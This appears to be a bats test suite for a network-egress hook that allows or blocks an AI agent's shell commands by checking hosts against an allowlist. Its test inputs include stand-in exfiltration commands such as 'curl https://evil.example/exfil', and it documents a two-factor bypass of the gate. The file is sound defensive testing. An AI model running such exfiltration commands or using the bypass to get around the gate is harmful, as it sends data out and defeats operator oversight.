#!/usr/bin/env bats
# tests/hooks/network-gate.bats
#
# OSS Trust A-2 — AC-2 coverage. `hooks/network-gate.sh` PreToolUse hook.
# Spec: docs/specs/network-egress-allowlist.md
# Parent: #122 OSS Trust epic
#
# Threat model: shell commands the agent issues can reach arbitrary hosts
# unless this hook blocks them. Composes with bash-denylist + approval-gate
# in the PreToolUse Bash chain (D-8 — all hooks must allow).
#
# I/O contract (Claude Code hook spec):
#   stdin:  JSON {"tool_name":"<name>","tool_input":{"command":"..."}}
#   stdout: JSON {"decision":"allow"|"block","reason":"..."}

setup() {
  REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
  HOOK="$REPO_ROOT/hooks/network-gate.sh"
  [[ -f "$HOOK" ]] || skip "network-gate.sh not present"

  TMP_HOME="$(mktemp -d)"
  TMP_CFG="$TMP_HOME/.config/walter-os"
  mkdir -p "$TMP_CFG"
  export HOME="$TMP_HOME"
  export WALTER_CONFIG="$TMP_CFG"
  export WALTER_OS_HOME="$REPO_ROOT"
  ALLOWLIST="$TMP_CFG/egress-allowlist.txt"
  # Clear bypass env between tests.
  unset WALTER_EGRESS_ALLOW_OVERRIDE || true
}

teardown() {
  cd "$BATS_TEST_DIRNAME"
  case "$TMP_HOME" in
    /tmp/*|/var/folders/*|/var/tmp/*) rm -rf "$TMP_HOME" ;;
  esac
  true
}

# Helper: feed a PreToolUse JSON for a Bash command into the hook.
_call_hook_bash() {
  local cmd="$1"
  printf '{"tool_name":"Bash","tool_input":{"command":%s}}' \
    "$(printf '%s' "$cmd" | jq -Rs .)" \
    | bash "$HOOK"
}

# Helper: feed a non-Bash tool event (should always pass through).
_call_hook_other() {
  local tool="$1"
  printf '{"tool_name":"%s","tool_input":{}}' "$tool" | bash "$HOOK"
}

# ---------------------------------------------------------------------------
# Passthrough cases (no decision needed)
# ---------------------------------------------------------------------------

@test "AC-2: non-Bash tool calls pass through (allow)" {
  run _call_hook_other Read
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: Bash command with no network call passes through (allow)" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash "ls -la /tmp"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: shell builtin / pipeline without a network CLI is allow" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'echo hello | grep h | wc -l'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# curl + wget — extract host from URL
# ---------------------------------------------------------------------------

@test "AC-2: curl https://api.github.com (in allowlist) → allow" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl https://api.github.com/repos/foo/bar'
  echo "$output"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: curl https://evil.example (empty allowlist) → block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'evil\.example|not in egress allowlist'
}

@test "AC-2: curl with flags before URL still extracts host" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl -X POST -H "Accept: application/json" https://api.github.com/issues'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: wget http://pypi.org → host extracted + checked" {
  echo 'pypi.org' > "$ALLOWLIST"
  run _call_hook_bash 'wget http://pypi.org/simple/foo'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: curl with no URL anywhere → fail-CLOSED (block)" {
  # This is an operator typo (`curl` alone). Fail-closed per spec.
  : > "$ALLOWLIST"
  run _call_hook_bash 'curl --help'
  [ "$status" -eq 0 ]
  # Either block ("can't extract host") OR allow (--help is harmless).
  # Spec AC-2 says fail-CLOSED on missing host for known network CLIs,
  # so we expect block. Operators who hit this run `curl --help` outside
  # the hook (it's a local-only command).
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Wildcard semantics inherited from the loader
# ---------------------------------------------------------------------------

@test "AC-2: wildcard subdomain match is honoured" {
  echo '*.openrouter.ai' > "$ALLOWLIST"
  run _call_hook_bash 'curl https://api.openrouter.ai/v1/chat'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: wildcard does NOT match apex (spec D-5)" {
  echo '*.openrouter.ai' > "$ALLOWLIST"
  run _call_hook_bash 'curl https://openrouter.ai/'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# git — both https and ssh-style URLs
# ---------------------------------------------------------------------------

@test "AC-2: git clone https://github.com/... (allowlisted) → allow" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git clone https://github.com/foo/bar.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: git clone git@github.com:foo/bar (ssh-form) → host extracted" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git clone git@github.com:foo/bar.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: git push to a non-allowlisted remote → block" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git push https://gitlab.example/foo/bar HEAD:main'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: git fetch/pull without an explicit remote URL is allow (local config)" {
  # `git fetch` / `git pull` with no URL reads from local repo config —
  # the network call ALSO happens, but the host is unknown to us. Per
  # spec AC-2 (fail-CLOSED on missing host for known network CLIs), we
  # block. But `git status` / `git log` are local-only and must NOT
  # trigger the hook even though they share the `git` binary.
  echo 'github.com' > "$ALLOWLIST"
  # Local-only git subcommand → allow.
  run _call_hook_bash 'git status'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
  run _call_hook_bash 'git log --oneline -5'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# gh — implicit github.com / GH_HOST
# ---------------------------------------------------------------------------

@test "AC-2: gh pr create with github.com allowlisted → allow" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'gh pr create --title "[FEAT] -TECHNICAL- foo" --body bar'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: gh pr create with github.com NOT allowlisted → block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'gh pr create --title x --body y'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# ssh / scp — extract user@host
# ---------------------------------------------------------------------------

@test "AC-2: ssh user@host with host allowlisted → allow" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh nico@walter-vm.tail.example ls /tmp'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: ssh host (no user) with host allowlisted → allow" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh walter-vm.tail.example uptime'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: scp file user@host:/path with host allowlisted → allow" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'scp ./file.txt nico@walter-vm.tail.example:/tmp/'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# pip / npm / uvx / cargo — implicit-host fail-CLOSED
# ---------------------------------------------------------------------------

@test "AC-2: pip install foo (implicit registry) → fail-CLOSED block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'pip install requests'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'implicit host|index-url|registry'
}

@test "AC-2: npm install foo (implicit registry) → fail-CLOSED block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'npm install lodash'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Two-factor bypass (WALTER_EGRESS_ALLOW_OVERRIDE=1 + --allow-egress-outbound)
# ---------------------------------------------------------------------------

@test "AC-2: two-factor bypass allows AND emits a systemMessage WARN" {
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl https://emergency.example/healthcheck --allow-egress-outbound'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
  echo "$output" | jq -er '.systemMessage // empty' | grep -qE 'network-gate|bypass|emergency.example'
}

@test "AC-2: env var alone does NOT bypass" {
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: flag alone does NOT bypass" {
  : > "$ALLOWLIST"
  unset WALTER_EGRESS_ALLOW_OVERRIDE
  run _call_hook_bash 'curl https://evil.example --allow-egress-outbound'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Robustness / fail-CLOSED
# ---------------------------------------------------------------------------

@test "AC-2: empty stdin → fail-CLOSED block" {
  run bash -c "printf '' | bash '$HOOK'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: malformed JSON → fail-CLOSED block" {
  run bash -c "printf '{not json' | bash '$HOOK'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: Bash event without command field → fail-CLOSED block" {
  run bash -c "printf '{\"tool_name\":\"Bash\",\"tool_input\":{}}' | bash '$HOOK'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}
